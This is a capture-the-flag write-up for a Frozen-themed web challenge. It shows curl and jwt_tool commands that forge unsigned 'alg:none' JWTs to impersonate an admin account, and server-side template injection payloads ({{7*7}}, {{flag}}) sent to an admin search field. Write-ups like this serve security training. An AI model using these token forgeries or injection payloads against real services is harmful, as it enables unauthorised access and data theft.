
# Thunderstorm of Hail and Fire

## Description

> > “Then the Lord said to Moses, ‘Stretch out your hand toward heaven, that there may be hail in all the land of Egypt—on man, on beast, and on every herb of the field, throughout the land of Egypt.’ And Moses stretched out his rod toward heaven; and the Lord sent thunder and hail, and fire darted to the ground. And the Lord rained hail on the land of Egypt” (Exodus 9:22-23).
> 
> Have you ever wondered what lies beneath the ice? Our application has secrets waiting to be uncovered. Keep a sharp eye and don't be afraid, you may find something that will warm your heart. So grab a hot chocolate and some cookies, and dive into the unknown!

A website was attached.

## Solution

We visit the provided link and arrive to the *Arendelle* website (the kingdom from Disney's *Frozen* series). We can sign up with a username and password, receiving the following cookie in the process:

```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ curl 'https://arendelle.plagues-of-egypt.com/register' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=test&password=test&password_confirmation=test' -v -s 2>&1 | grep Cookie
< Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImNyZWF0ZWRBdCI6MTY4MTI5ODg3OH0.Uyo8lLg_UYGRWmfDFQpPivz3qSO-tJI0UXrzD35fSkI; Path=/
```

Once logged in, we can try to access the "Control Panel" via a link in the header, but it is blocked with the following message:

```
Sadly, you don't have permissions to get here
```

Clearly we need to find a way to access this page. The cookie we received earlier is a Json Web Token (JWT):

```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ python3 ~/utils/web/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImNyZWF0ZWRBdCI6MTY4MTI5ODg3OH0.Uyo8lLg_UYGRWmfDFQpPivz3qSO-tJI0UXrzD35fSkI

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "HS256"

Token payload values:
[+] username = "test"
[+] role = "user"
[+] createdAt = 1681298878

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

We can see that the role is "user", we probably want to change it to "admin". However, the token is signed so we can't just change the value without modifying the signature to match.
The signing algorithm is "HS256" (HMAC with SHA-256), which means that there's some keyphrase that we need to know in order to resign the token. 
However, there's a known JWT attack where the attacker changes the algorithm to "none" and therefore doesn't need to resign the token. If the server is vulnerable, it will accept
a token signed with no algorithm at all.

```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ python3 ~/utils/web/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImNyZWF0ZWRBdCI6MTY4MTI5ODg3OH0.Uyo8lLg_UYGRWmfDFQpPivz3qSO-tJI0UXrzD35fSkI -X a -I -pc role -pv admin

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi

Original JWT:

jwttool_a901d3da75eeac8790b75d80c075d871 - EXPLOIT: "alg":"none" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4iLCJjcmVhdGVkQXQiOjE2ODEyOTg4Nzh9.
jwttool_4f0a93985bcda3eef2b2d64342da9c4c - EXPLOIT: "alg":"None" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4iLCJjcmVhdGVkQXQiOjE2ODEyOTg4Nzh9.
jwttool_f514a58b8654c6e971a6a321405c7887 - EXPLOIT: "alg":"NONE" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4iLCJjcmVhdGVkQXQiOjE2ODEyOTg4Nzh9.
jwttool_b8a274d3c19b87b8bdf1cd87ee630598 - EXPLOIT: "alg":"nOnE" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJuT25FIn0.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4iLCJjcmVhdGVkQXQiOjE2ODEyOTg4Nzh9.
```

We can try it but it doesn't work. Back to the website, let's search for more clues.

In the sources, we can find the following comment:

```html
<!-- TODO: save new users in /logs -->
```

What's this `/logs`?

```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ curl https://arendelle.plagues-of-egypt.com/logs
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Arendelle</title>
    <link rel="icon" href="./static/icon.png" />
</head>
<body>
    <pre>

+----------+-------+---------------+
| username | role  | createdAt     |
+----------+-------+---------------+
| Yogev    | user  | 1680642000000 |
+----------+-------+---------------+
| Anna     | user  | 1386280800000 |
+----------+-------+---------------+
| Jordi    | user  | 1681333200000 |
+----------+-------+---------------+
| Idan     | user  | 1680642000000 |
+----------+-------+---------------+
| Aviv     | user  | 1681333200000 |
+----------+-------+---------------+
| Tal      | user  | 1681333200000 |
+----------+-------+---------------+
| Moses    | user  | undefined     |
+----------+-------+---------------+
| Olaf     | user  | 1386280800000 |
+----------+-------+---------------+
| Amit     | user  | 1680642000000 |
+----------+-------+---------------+
| Elsa     | admin | 1386280800000 |
+----------+-------+---------------+
| Tomer    | user  | 1681333200000 |
+----------+-------+---------------+
| Kristoff | user  | 1386280800000 |
+----------+-------+---------------+
    </pre>
</body>
</html>
```

Interesting, we have "Elsa" there, and she is the admin! We can try and use her data to spoof the JWT:

```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ python3 ~/utils/web/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImNyZWF0ZWRBdCI6MTY4MTI5ODg3OH0.Uyo8lLg_UYGRWmfDFQpPivz3qSO-tJI0UXrzD35fSkI -X a -I -pc role -pv admin -pc username -pv Elsa -pc createdAt -pv 1386280800000

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi

Original JWT:

jwttool_cd8fa79b971c229e37fab44c8a162c03 - EXPLOIT: "alg":"none" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6IkVsc2EiLCJyb2xlIjoiYWRtaW4iLCJjcmVhdGVkQXQiOjEzODYyODA4MDAwMDB9.
jwttool_06f32fcf5e937596242f10cf152bd768 - EXPLOIT: "alg":"None" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VybmFtZSI6IkVsc2EiLCJyb2xlIjoiYWRtaW4iLCJjcmVhdGVkQXQiOjEzODYyODA4MDAwMDB9.
jwttool_7604e6c944f9def4f693ba9ac91ec839 - EXPLOIT: "alg":"NONE" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJ1c2VybmFtZSI6IkVsc2EiLCJyb2xlIjoiYWRtaW4iLCJjcmVhdGVkQXQiOjEzODYyODA4MDAwMDB9.
jwttool_8bb708abe567ec9bca046b784c743f4d - EXPLOIT: "alg":"nOnE" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJuT25FIn0.eyJ1c2VybmFtZSI6IkVsc2EiLCJyb2xlIjoiYWRtaW4iLCJjcmVhdGVkQXQiOjEzODYyODA4MDAwMDB9.
```

Let's try that:

```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ curl 'https://arendelle.plagues-of-egypt.com/admin' -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6IkVsc2EiLCJyb2xlIjoiYWRtaW4iLCJjcmVhdGVkQXQiOjEzODYyODA4MDAwMDB9.'
<html>
    <head>
        <title>Arendelle</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css">
        <link rel="stylesheet" href="./static/style.css" />
        <link rel="icon" href="./static/icon.png">
    </head>
    <body>
        <nav class="navbar" role="navigation" aria-label="main navigation">
            <div id="navbar" class="navbar-menu">
              <div class="navbar-start">
                <a class="navbar-item" href="./"> Arendelle </a>
                <a class="navbar-item" href="./home"> Home </a>
                <a class="navbar-item has-text-weight-medium" href="./admin"> Control Panel </a>
              </div>
            </div>
        </nav>
        <div class="columns">
            <section class="column">
                <div class="card">

                    <article class="notification is-success is-light has-text-centered">
                        Welcome Admin of Arendelle kingdom,

                        The flag is closer than you think
                    </article>
                </div>
            </section>
        </div>

        <div class="columns is-centered">
            <section class="column is-half">
                <form action="./admin" method="GET">
                    <div class="field has-addons">
                        <div class="control is-expanded">
                            <input class="input" type="text" name="search" id="search" placeholder="what are you looking for?">
                        </div>
                        <div class="control">
                            <button class="button is-info">
                                Search
                            </button>
                        </div>
                    </div>
                </form>
            </section>
        </div>
        <div class="columns is-centered">
            <div>
                result: no result
            </div>
        </div>

    </body>
</html>
```

Looks like it worked! The website greets us with `Welcome Admin of Arendelle kingdom` and tells us that `The flag is closer than you think`. The control panel contains a search engine, what should we search for?

After trying different things, we find that the site is vulnerable to a template injection attack. For example, if we search for `{{7*7}}`, we get:

```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ curl 'https://arendelle.plagues-of-egypt.com/admin?search=%7B%7B7*7%7D%7D' -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6IkVsc2EiLCJyb2xlIjoiYWRtaW4iLCJjcmVhdGVkQXQiOjEzODYyODA4MDAwMDB9.' -s | grep result
                result: 49
```

We search for `{{flag}}` and receive the flag:

```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ curl 'https://arendelle.plagues-of-egypt.com/admin?search=%7B%7Bflag%7D%7D' -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGc
iOiJub25lIn0.eyJ1c2VybmFtZSI6IkVsc2EiLCJyb2xlIjoiYWRtaW4iLCJjcmVhdGVkQXQiOjEzODYyODA4MDAwMDB9.' -s | grep result
                result: BSMCH{Elsa&#39;s_S3cur1ty_M3ltD0wn}
```

The flag: `BSMCH{Elsa's_S3cur1ty_M3ltD0wn}`